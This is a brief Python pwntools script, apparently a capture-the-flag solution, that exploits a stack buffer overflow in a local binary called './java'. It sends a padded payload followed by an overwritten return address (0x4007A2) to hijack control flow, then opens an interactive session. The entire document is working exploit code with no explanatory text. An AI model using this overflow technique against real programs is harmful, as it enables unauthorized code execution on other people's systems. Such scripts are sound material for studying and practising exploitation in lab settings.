from pwn import *

ex = "./java"

p = process(ex)

offset = 28
buffer = b'java' + b'A' * offset

address = p64(0x4007A2)

msg = buffer + address

p.sendline(msg)
p.interactive()
